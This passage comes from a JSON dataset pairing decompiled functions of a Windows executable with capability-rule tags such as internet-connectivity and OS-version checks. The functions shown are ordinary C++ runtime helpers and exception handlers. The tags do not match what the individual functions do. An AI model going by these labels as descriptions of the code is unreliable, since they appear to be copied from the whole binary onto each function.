        "decompiled_code": "\nuint32_t fcn.00446ce0(char *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    \n    if ((param_2 != 0) && (pcVar2 = param_1,  *param_1 != '\\0')) {\n        do {\n            pcVar2 = pcVar2 + 1;\n            uVar1 = pcVar2 - param_1;\n            if (param_2 <= uVar1) {\n                return uVar1;\n            }\n        } while (*pcVar2 != '\\0');\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 144
    },
    "00446d20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00446d20(int16_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (param_2 == 0) {\n        return;\n    }\n    if (*param_1 != 0) {\n        while (iVar1 = iVar1 + 1,  param_2 != iVar1) {\n            if (param_1[iVar1] == 0) {\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "00447dd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t ** __fastcall fcn.00447dd0(uint param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t in_AL;\n    uint8_t uVar2;\n    char cVar3;\n    uint8_t **ppuVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t *piVar10;\n    uint uVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint8_t **extraout_ECX;\n    int32_t *piVar14;\n    uint8_t **ppuVar15;\n    int32_t *piVar16;\n    int32_t *extraout_EDX;\n    uint8_t **ppuVar17;\n    int32_t **ppiVar18;\n    code *pcVar19;\n    int32_t *unaff_EDI;\n    ulong uVar20;\n    int32_t in_stack_ffffffc4;\n    uint8_t **ppuStack52;\n    uint32_t in_stack_ffffffe8;\n    int32_t iStack20;\n    \n    if (in_AL == 0xff) {\n        return NULL;\n    }\n    uVar2 = in_AL & 0x70;\n    if (uVar2 == 0x20) {\n        ppuVar4 = fcn.0043a5d0(param_2);\n        return ppuVar4;\n    }\n    if (uVar2 < 0x21) {\n        if (((in_AL & 0x70) == 0) || (uVar2 == 0x10)) {\n            return NULL;\n        }\n    }\n    else {\n        if (uVar2 == 0x40) {\n            ppuVar4 = fcn.0043a580(param_2);\n            return ppuVar4;\n        }\n        if (uVar2 == 0x50) {\n            return NULL;\n        }\n        if (uVar2 == 0x30) {\n            ppuVar4 = fcn.0043a5c0(param_2);\n            return ppuVar4;\n        }\n    }\n    ppuVar4 = sub.msvcrt.dll_abort();\n    if (in_stack_ffffffe8 < 2) {\n        LOCK();\n        piVar10 = iStack20 + -0x40;\n        *piVar10 = *piVar10 + -1;\n        if (*piVar10 != 0) {\n            return ppuVar4;\n        }\n        if (*(iStack20 + -0x2c) != NULL) {\n            in_stack_ffffffc4 = 0x447e54;\n            (**(iStack20 + -0x2c))();\n        }\n        uVar7 = iStack20 - 0x40;\n        if ((uVar7 <= *0x515d24) || (*0x515d24 + *0x515d28 <= uVar7)) {\n    // WARNING: Could not recover jumptable at 0x00446e88. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppuVar4 = (*_sym.imp.msvcrt.dll_free)(uVar7);\n            return ppuVar4;\n        }\n        if ((*0x515a34 == NULL) || (iVar5 = fcn.004382e0(0x515d18),  iVar5 == 0)) {\n            unaff_EDI = iStack20 + -0x50;\n            if (*0x515d20 == NULL) goto code_r0x00448330;\n            in_stack_ffffffc4 = *(iStack20 + -0x50);\n            piVar10 = unaff_EDI + in_stack_ffffffc4;\n            if (piVar10 < *0x515d20) goto code_r0x00448330;\n            piVar6 = (*0x515d20)[1];\n            if (*0x515d20 == piVar10) {\n                iVar5 = **0x515d20;\n                *(iStack20 + -0x4c) = piVar6;\n                *(iStack20 + -0x50) = in_stack_ffffffc4 + iVar5;\n                ppuVar4 = *0x515a34;\n                *0x515d20 = unaff_EDI;\n                goto joined_r0x00448310;\n            }\n            piVar14 = *0x515d20;\n            if (piVar6 == NULL) {\n                piVar6 = NULL;\n                ppiVar18 = 0x515d20;\n            }\n            else {\n                piVar16 = *0x515d20;\n                if (piVar10 < piVar6) {\n                    do {\n                        piVar14 = piVar6;\n                        piVar6 = piVar14[1];\n                        ppiVar18 = piVar16 + 1;\n                        if (piVar6 == NULL) break;\n                        piVar16 = piVar14;\n                    } while (piVar10 < piVar6);\n                }\n                else {\n                    ppiVar18 = 0x515d20;\n                }\n            }\n            if (piVar6 == piVar10) {\n                in_stack_ffffffc4 = in_stack_ffffffc4 + *piVar6;\n                piVar14[1] = piVar6[1];\n            }\n            piVar10 = *ppiVar18;\n            uVar20 = CONCAT44(*piVar10, piVar10);\n            if (unaff_EDI != piVar10 + *piVar10) {\n                *(iStack20 + -0x4c) = piVar10[1];\n                piVar10 = *ppiVar18;\n                *(iStack20 + -0x50) = in_stack_ffffffc4;\n                piVar10[1] = unaff_EDI;\n                ppuVar4 = *0x515a34;\n                goto joined_r0x00448310;\n            }\n        }\n        else {\n            uVar20 = fcn.00449d10();\n        }\n        *uVar20 = (uVar20 >> 0x20) + in_stack_ffffffc4;\n        ppuVar4 = *0x515a34;\njoined_r0x00448310:\n        while ((*0x515a34 = ppuVar4,  ppuVar4 != NULL && (ppuVar4 = fcn.00438340(0x515d18),  ppuVar4 != NULL))) {\n            fcn.00449d40();\n            *0x515d20 = extraout_EDX;\ncode_r0x00448330:\n            *(iStack20 + -0x4c) = *0x515d20;\n            ppuVar4 = *0x515a34;\n            *0x515d20 = unaff_EDI;\n        }\n        return ppuVar4;\n    }\n    uVar20 = fcn.00447fc0(*(iStack20 + -0x24));\n    uVar2 = uVar20;\n    if (uVar2 == 0x50) {\n        ppuVar4 = extraout_ECX + 3 & 0xfffffffc;\n        *ppuStack52 = *ppuVar4;\n        return ppuVar4 + 1;\n    }\n    switch(uVar20 & 0xf) {\n    case 0:\n    case 3:\n    case 0xb:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 1;\n        break;\n    case 1:\n        ppuVar17 = NULL;\n        uVar13 = 0;\n        ppuVar15 = extraout_ECX;\n        do {\n            ppuVar4 = ppuVar15 + 1;\n            uVar12 = *ppuVar15;\n            uVar1 = uVar13 & 0x1f;\n            uVar13 = uVar13 + 7;\n            ppuVar17 = ppuVar17 | (uVar12 & 0x7f) << uVar1;\n            ppuVar15 = ppuVar4;\n        } while (uVar12 < '\\0');\n        break;\n    case 2:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 2;\n        break;\n    case 4:\n    case 0xc:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 2;\n        break;\n    default:\n        uVar8 = sub.msvcrt.dll_abort();\n        fcn.004c2e40(uVar8);\n        uVar8 = fcn.004bf910();\n        fcn.004c2e40(uVar8);\n        fcn.004c30e0();\n        while( true ) {\n            fcn.00447c80();\n            cVar3 = fcn.00447d60(extraout_ECX);\n            if (cVar3 != '\\0') break;\n            cVar3 = fcn.00447d60(extraout_ECX);\n            if (cVar3 != '\\0') goto code_r0x004c3c5e;\n            fcn.00447fc0();\n        }\n        fcn.004c32d0();\ncode_r0x004c3c5e:\n        puVar9 = fcn.004c2d80(4);\n        *puVar9 = 0x52c0b4;\n        fcn.004c3330(puVar9, 0x528938, 0x496100);\n        uVar8 = sub.msvcrt.dll_abort();\n        fcn.004c2e40(uVar8);\n        uVar20 = sub.msvcrt.dll_abort();\n        fcn.004c2fb0();\n        pcVar19 = (uVar20 >> 0x20) + 1;\n        if (pcVar19 != NULL) {\n            fcn.0043a8e0(uVar20);\n        }\n        uVar20 = fcn.004c2f10();\n        if (uVar20 >> 0x20 != 1) goto code_r0x004c3d3d;\n        piVar10 = fcn.004c2e40(uVar20);\n        uVar8 = (**(*piVar10 + 8))();\n        uVar11 = (*pcVar19)(2);\n        sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar11);\n        uVar11 = (*pcVar19)(2);\n        sub.msvcrt.dll_fputs(uVar8, uVar11);\n        uVar8 = (*pcVar19)(2);\n        sub.msvcrt.dll_fputc(10, uVar8);\n        fcn.004c2fb0();\n        do {\n            sub.msvcrt.dll_abort();\n            fcn.00446e88();\n            fcn.004c32d0();\ncode_r0x004c3d3d:\n            fcn.004c2e40();\n            fcn.004c2fb0();\n        } while( true );\n    case 9:\n        ppuVar17 = NULL;\n        uVar7 = 0;\n        ppuVar15 = extraout_ECX;\n        do {\n            ppuVar4 = ppuVar15 + 1;\n            uVar13 = *ppuVar15;\n            uVar12 = uVar7;\n            uVar7 = uVar7 + 7;\n            ppuVar17 = ppuVar17 | (uVar13 & 0x7f) << (uVar12 & 0x1f);\n            ppuVar15 = ppuVar4;\n        } while (uVar13 < '\\0');\n        if ((0x1f < uVar7) || ((uVar13 & 0x40) == 0)) break;\n        ppuVar17 = ppuVar17 | -1 << (uVar7 & 0x1f);\n        goto code_r0x00447eb9;\n    case 10:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 2;\n    }\n    if (ppuVar17 != NULL) {\ncode_r0x00447eb9:\n        ppuVar15 = extraout_ECX;\n        if ((uVar2 & 0x70) != 0x10) {\n            ppuVar15 = uVar20 >> 0x20;\n        }\n        ppuVar17 = ppuVar17 + ppuVar15;\n        if (uVar2 < '\\0') {\n            *ppuStack52 = *ppuVar17;\n            return ppuVar4;\n        }\n    }\n    *ppuStack52 = ppuVar17;\n    return ppuVar4;\n}\n",
        "token_count": 2809
    },
    "00449b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __cdecl fcn.00449b20(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    char *pcVar10;\n    char **ppcVar11;\n    char **ppcVar12;\n    char **ppcVar13;\n    char **ppcVar14;\n    ulong uVar15;\n    char *apcStack220 [4];\n    int32_t aiStack204 [4];\n    int32_t aiStack188 [10];\n    uchar uStack145;\n    int32_t var_8ch;\n    uchar var_81h;\n    uint var_80h;\n    uint var_1ch;\n    \n    _var_81h = str.not_enough_space_for_format_expansion__Please_submit_full_bug_report_at_https:__gcc.gnu.org_bugs__:_n____\n               ._0_4_;\n    var_1ch = str.not_enough_space_for_format_expansion__Please_submit_full_bug_report_at_https:__gcc.gnu.org_bugs__:_n____\n              ._101_4_;\n    puVar6 = 0x5244f9;\n    puVar3 = &fcn.00449b20::var_80h;\n    for (iVar7 = 0x1a; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    aiStack188[3] = 0x449b62;\n    uVar15 = fcn.00437ed0();\n    var_8ch = uVar15 >> 0x20;\n    iVar7 = -uVar15;\n    puVar9 = &stack0xffffff6f + iVar7 & 0xfffffff0;\n    puVar6 = &stack0xffffff7b;\n    puVar3 = puVar9;\n    for (iVar8 = 0x1a; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(&stack0xffffff5c + iVar7) = var_8ch;\n    *(&stack0xffffff54 + iVar7) = puVar9 + 0x1a;\n    *(&stack0xffffff58 + iVar7) = arg_8h;\n    *(&stack0xffffff50 + iVar7) = 0x449b96;\n    sub.msvcrt.dll_memcpy();\n    *(puVar9 + var_8ch + 0x68) = 0;\n    *(&stack0xffffff54 + iVar7) = puVar9;\n    *(&stack0xffffff50 + iVar7) = 0x449ba9;\n    fcn.004be210(*(&stack0xffffff54 + iVar7));\n    *(&stack0xffffff50 + iVar7) = puVar3;\n    *(&stack0xffffff4c + iVar7) = puVar6;\n    *(&stack0xffffff48 + iVar7) = puVar9;\n    if (*0x5174fc != '\\0') {\n        *(&stack0xffffff28 + iVar7) = 2;\n        ppcVar14 = &stack0xffffff24 + iVar7;\n        *(&stack0xffffff24 + iVar7) = 0x449ce3;\n        pcVar10 = (**0x515aa0)();\n        ppcVar14[2] = 0x1d;\n        ppcVar14[3] = pcVar10;\n        ppcVar14[1] = 0x1;\n        *ppcVar14 = \"terminate called recursively\\n\";\n        ppcVar14[-1] = 0x449d03;\n        sub.msvcrt.dll_fwrite();\n        ppcVar14[-1] = 0x449d08;\n        sub.msvcrt.dll_abort();\n        ppcVar14[-7] = 0x4;\n        ppcVar14[-8] = 0x449d1f;\n        puVar6 = fcn.004c2d80();\n        *puVar6 = 0x52b508;\n        ppcVar14[-5] = 0x449ae0;\n        ppcVar14[-6] = 0x528188;\n        ppcVar14[-7] = puVar6;\n        ppcVar14[-8] = 0x449d3d;\n        fcn.004c3330();\n        ppcVar14[-0xe] = 0x4;\n        ppcVar14[-0xf] = 0x449d4f;\n        puVar6 = fcn.004c2d80();\n        *puVar6 = 0x52b51c;\n        ppcVar14[-0xc] = 0x449b10;\n        ppcVar14[-0xd] = 0x528194;\n        ppcVar14[-0xe] = puVar6;\n        ppcVar14[-0xf] = 0x449d6d;\n        fcn.004c3330();\n        if (*0x515d24 == 0) {\n            return;\n        }\n        ppcVar14[-0x15] = *0x515d24;\n        ppcVar14[-0x16] = 0x449d84;\n        fcn.00446e88();\n        *0x515d24 = 0;\n        return;\n    }\n    *0x5174fc = 1;\n    *(&stack0xffffff24 + iVar7) = 0x449bcf;\n    iVar8 = fcn.004c2f50();\n    if (iVar8 == 0) {\n        *(&stack0xffffff28 + iVar7) = 2;\n        ppcVar13 = &stack0xffffff24 + iVar7;\n        *(&stack0xffffff24 + iVar7) = 0x449cb1;\n        pcVar10 = (**0x515aa0)();\n        ppcVar13[2] = 0x2d;\n        ppcVar13[3] = pcVar10;\n        ppcVar13[1] = 0x1;\n        *ppcVar13 = \"terminate called without an active exception\\n\";\n        ppcVar13[-1] = 0x449cd1;\n        sub.msvcrt.dll_fwrite();\n        do {\n            *(ppcVar13 + -4) = 0x4c3d30;\n            sub.msvcrt.dll_abort();\ncode_r0x004c3d30:\n            *ppcVar13 = puVar3;\n            ppcVar13[-1] = 0x4c3d38;\n            fcn.00446e88();\ncode_r0x004c3d38:\n            *(ppcVar13 + -4) = 0x4c3d3d;\n            fcn.004c32d0();\n            *(ppcVar13 + -4) = 0x4c3d42;\n            fcn.004c2e40();\n            *(ppcVar13 + -4) = 0x4c3d47;\n            fcn.004c2fb0();\n        } while( true );\n    }\n    pcVar10 = *(iVar8 + 4);\n    cVar1 = *pcVar10;\n    *(&stack0xffffff30 + iVar7) = 0;\n    *(&stack0xffffff2c + iVar7) = 0;\n    pcVar10 = pcVar10 + (cVar1 == '*');\n    *(&stack0xffffff44 + iVar7) = 0xffffffff;\n    *(&stack0xffffff34 + iVar7) = &stack0xffffff44 + iVar7;\n    *(&stack0xffffff28 + iVar7) = pcVar10;\n    *(&stack0xffffff24 + iVar7) = 0x449c0c;\n    puVar3 = fcn.00436de0();\n    pcVar2 = *0x515aa0;\n    *(&stack0xffffff28 + iVar7) = 2;\n    ppcVar11 = &stack0xffffff24 + iVar7;\n    *(&stack0xffffff24 + iVar7) = 0x449c1d;\n    pcVar4 = (**0x515aa0)();\n    ppcVar11[2] = 0x30;\n    ppcVar11[3] = pcVar4;\n    ppcVar11[1] = 0x1;\n    *ppcVar11 = \"terminate called after throwing an instance of \\'\";\n    ppcVar11[-1] = 0x449c3d;\n    sub.msvcrt.dll_fwrite();\n    *ppcVar11 = 0x2;\n    if (ppcVar11[7] == NULL) {\n        ppcVar12 = ppcVar11 + -1;\n        ppcVar11[-1] = 0x449c96;\n        uVar5 = (*pcVar2)();\n        *ppcVar12 = puVar3;\n        ppcVar12[1] = uVar5;\n        ppcVar12[-1] = 0x449ca2;\n        sub.msvcrt.dll_fputs();\n    }\n    else {\n        ppcVar12 = ppcVar11 + -1;\n        ppcVar11[-1] = 0x449c4e;\n        pcVar4 = (*pcVar2)();\n        *ppcVar12 = pcVar10;\n        ppcVar12[1] = pcVar4;\n        ppcVar12[-1] = 0x449c5a;\n        sub.msvcrt.dll_fputs();\n    }\n    *ppcVar12 = 0x2;\n    ppcVar13 = ppcVar12 + -1;\n    ppcVar12[-1] = 0x449c63;\n    uVar5 = (*pcVar2)();\n    ppcVar13[2] = 0x2;\n    ppcVar13[3] = uVar5;\n    ppcVar13[1] = 0x1;\n    *ppcVar13 = 0x52367d;\n    ppcVar13[-1] = 0x449c83;\n    sub.msvcrt.dll_fwrite();\n    if (ppcVar13[7] != NULL) goto code_r0x004c3d38;\n    goto code_r0x004c3d30;\n}\n",
        "token_count": 2350
    },
    "0044ab10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.0044ab10(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint var_bp_ch;\n    \n    *in_ECX = in_ECX + 2;\n    in_ECX[1] = 0;\n    *(in_ECX + 2) = 0;\n    if (arg_ch != 1) {\n        fcn.004afdd0(0, 0, 0x526a18, 0xd);\n        return;\n    }\n    fcn.004afdd0(0, 0, \"iostream error\", 0xe);\n    return;\n}\n",
        "token_count": 158
    },
    "0044b110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0044b110(int32_t *param_1, ushort *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    ushort *puVar1;\n    uint32_t *extraout_ECX;\n    uint32_t uVar2;\n    \n    uVar2 = *(*param_1 + -0xc);\n    if (uVar2 < param_4) {\n        fcn.004be900(0x523b18, 0x523b94);\n        return *extraout_ECX;\n    }\n    uVar2 = uVar2 - param_4;\n    if (param_3 < uVar2) {\n        uVar2 = param_3;\n    }\n    if (uVar2 != 0) {\n        puVar1 = *param_1 + param_4 * 2;\n        if (uVar2 == 1) {\n            *param_2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, puVar1, uVar2 * 2);\n    }\n    return uVar2;\n}\n",
        "token_count": 250
    },
    "0044bff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0044bff0(int32_t *param_1, uchar *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uchar *puVar1;\n    uint32_t *extraout_ECX;\n    uint32_t uVar2;\n    \n    uVar2 = *(*param_1 + -0xc);\n    if (uVar2 < param_4) {\n        fcn.004be900(0x523908, 0x523984);\n        return *extraout_ECX;\n    }\n    uVar2 = uVar2 - param_4;\n    if (param_3 < uVar2) {\n        uVar2 = param_3;\n    }\n    if (uVar2 != 0) {\n        puVar1 = param_4 + *param_1;\n        if (uVar2 == 1) {\n            *param_2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, puVar1, uVar2);\n    }\n    return uVar2;\n}\n",
        "token_count": 242
    },
    "00451460": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00451460(int32_t *param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iVar1;\n    \n    if (*(param_1 + 7) != '\\x01') {\n        if (*(param_1 + 7) == '\\0') {\n            fcn.004512b0();\n            UNRECOVERED_JUMPTABLE = *(*param_1 + 0x1c);\n        }\n        else {\n            UNRECOVERED_JUMPTABLE = *(*param_1 + 0x1c);\n        }\n        if (UNRECOVERED_JUMPTABLE != 0x451530) {\n    // WARNING: Could not recover jumptable at 0x004514d6. Too many branches\n    // WARNING: Treating indirect jump as call\n            iVar1 = (*UNRECOVERED_JUMPTABLE)();\n            return iVar1;\n        }\n    }\n    sub.msvcrt.dll_memcpy(param_4, param_2, param_3 - param_2);\n    return param_3;\n}\n",
        "token_count": 256
    },
    "00451730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00451730(uint16_t param_1)\n\n{\n    uint uVar1;\n    \n    if (param_1 == 0x10) {\n        uVar1 = fcn.0043d8c0(0x523d0c);\n        return uVar1;\n    }\n    if (param_1 < 0x11) {\n        if (param_1 == 4) {\n            uVar1 = fcn.0043d8c0(0x523cfa);\n            return uVar1;\n        }\n        if (param_1 < 5) {\n            if (param_1 == 1) {\n                uVar1 = fcn.0043d8c0(0x523cee);\n                return uVar1;\n            }\n            if (param_1 == 2) {\n                uVar1 = fcn.0043d8c0(0x523cf4);\n                return uVar1;\n            }\n        }\n        else {\n            if (param_1 == 8) {\n                uVar1 = fcn.0043d8c0(0x523d00);\n                return uVar1;\n            }\n            if (param_1 == 0xc) {\n                uVar1 = fcn.0043d8c0(0x523d13);\n                return uVar1;\n            }\n        }\n    }\n    else {\n        if (param_1 == 0x100) {\n            uVar1 = fcn.0043d8c0(0x523ce8);\n            return uVar1;\n        }\n        if (param_1 < 0x101) {\n            if (param_1 == 0x20) {\n                uVar1 = fcn.0043d8c0(0x523cdc);\n                return uVar1;\n            }\n            if (param_1 == 0x40) {\n                uVar1 = fcn.0043d8c0(0x523ce2);\n                return uVar1;\n            }\n        }\n        else {\n            if (param_1 == 0x200) {\n                uVar1 = fcn.0043d8c0(0x523d06);\n                return uVar1;\n            }\n            if (param_1 == 0x20c) {\n                uVar1 = fcn.0043d8c0(0x523d19);\n                return uVar1;\n            }\n        }\n    }\n    uVar1 = 0;\n    if (param_1 == 0x400) {\n        uVar1 = fcn.0043d8c0(\"blank\");\n    }\n    return uVar1;\n}\n",
        "token_count": 581
    },
    "00454b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00454b80(int32_t *param_1, uchar *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint32_t *extraout_ECX;\n    uint32_t uVar1;\n    \n    if (param_1[1] < param_4) {\n        fcn.004be900(0x524584, 0x52469f);\n        return *extraout_ECX;\n    }\n    uVar1 = param_1[1] - param_4;\n    if (param_3 < uVar1) {\n        uVar1 = param_3;\n    }\n    if (uVar1 != 0) {\n        if (uVar1 == 1) {\n            *param_2 = *(param_4 + *param_1);\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, param_4 + *param_1, uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 224
    },
    "00455930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00455930(int32_t *param_1, ushort *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    ushort *puVar1;\n    uint32_t *extraout_ECX;\n    uint32_t uVar2;\n    \n    if (param_1[1] < param_4) {\n        fcn.004be900(0x5248f4, \"basic_string::copy\");\n        return *extraout_ECX;\n    }\n    uVar2 = param_1[1] - param_4;\n    if (param_3 < uVar2) {\n        uVar2 = param_3;\n    }\n    if (uVar2 != 0) {\n        puVar1 = *param_1 + param_4 * 2;\n        if (uVar2 == 1) {\n            *param_2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, puVar1, uVar2 * 2);\n    }\n    return uVar2;\n}\n",
        "token_count": 241
    },
    "0045f2a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0045f2a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint *arg_24h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    ulong uVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    piVar4 = fcn.004c0160(arg_1ch + 0x6c);\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    var_30h = &var_28h;\n    if (arg_18h == '\\0') {\n        uVar5 = fcn.0045d860(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n        iVar2 = var_2ch;\n    }\n    else {\n        uVar5 = fcn.0045e570(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n        iVar2 = var_2ch;\n    }\n    var_2ch = iVar2;\n    if (iVar2 != 0) {\n        fcn.004b1210(iVar2, 0);\n        puVar3 = var_30h;\n        uVar1 = *arg_24h;\n        if (*(piVar4 + 7) != '\\x01') {\n            if (*(piVar4 + 7) == '\\0') {\n                fcn.004512b0();\n            }\n            if (*(*piVar4 + 0x1c) != 0x451530) {\n                (**(*piVar4 + 0x1c))(puVar3, iVar2 + puVar3, uVar1);\n                goto code_r0x0045f31f;\n            }\n        }\n        sub.msvcrt.dll_memcpy(uVar1, puVar3, iVar2);\n    }\ncode_r0x0045f31f:\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    return uVar5;\n}\n",
        "token_count": 588
    },
    "0045f400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0045f400(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    ulong uVar1;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    var_30h = &var_28h;\n    if (arg_18h == '\\0') {\n        uVar1 = fcn.0045d860(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    else {\n        uVar1 = fcn.0045e570(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    var_34h = fcn.004ae940();\n    fcn.004bd410(var_30h, arg_24h, arg_20h, &var_34h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    return uVar1;\n}\n",
        "token_count": 352
    },
    "00461090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00461090(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint64_t uVar1;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    var_30h = &var_28h;\n    if (arg_18h == '\\0') {\n        uVar1 = fcn.0045f4d0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    else {\n        uVar1 = fcn.00460210(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    var_34h = fcn.004ae940();\n    fcn.004bd410(var_30h, arg_24h, arg_20h, &var_34h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    return 